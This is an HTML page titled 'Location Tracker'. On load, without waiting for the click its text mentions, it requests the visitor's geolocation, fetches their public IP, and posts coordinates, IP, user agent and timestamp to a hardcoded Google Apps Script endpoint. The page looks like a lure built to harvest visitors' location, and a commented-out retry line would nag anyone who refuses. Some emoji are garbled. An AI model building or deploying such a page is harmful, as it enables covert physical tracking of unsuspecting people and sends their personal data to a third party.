<!DOCTYPE html>
<html>
<head>
  <title>Location Tracker</title>
</head>
<body>
  <h2>User Location Tracker</h2>
  <img src="https://via.placeholder.com/400x200" alt="Sample Image" />
  <div id="output">Click the button to find location.</div>
  <br>

  <script>
      fetchAndStore();
    const output = document.getElementById("output");
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyqDE7cAtFmgXH2lT49teT2HrlI5UAT03QWE5klI5CmpjAGI3EP2puum-niwOMyMPCm/exec';

    async function getIPAddress() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip || "Unknown";
      } catch {
        return "Unknown";
      }
    }

    async function fetchAndStore() {
      if (!navigator.geolocation) {
        output.innerHTML = "‚ùå Your browser does not support Geolocation.";
        return;
      }

      navigator.geolocation.getCurrentPosition(async position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const ip = await getIPAddress();
        const userAgent = navigator.userAgent;
        const timestamp = new Date().toLocaleString();

        output.innerHTML = `üìç Latitude: ${latitude}<br>üìç Longitude: ${longitude}<br>üì° Sending to server...`;

    console.log("Latitude"+latitude)
        try {
          const response = await fetch(scriptURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, ip, userAgent, timestamp })
          });
          const text = await response.text();
          output.innerHTML += `<br>‚úÖ Server Response: ${text}`;
        } catch (err) {
          output.innerHTML += `<br>‚ùå Failed to send data: ${err.message}`;
        }
      }, error => {
        output.innerHTML = "‚ùå Location denied. Please allow location.";
        //setTimeout(fetchAndStore, 4000); // Retry after 4 seconds
      });
    }
  </script>
</body>
</html>
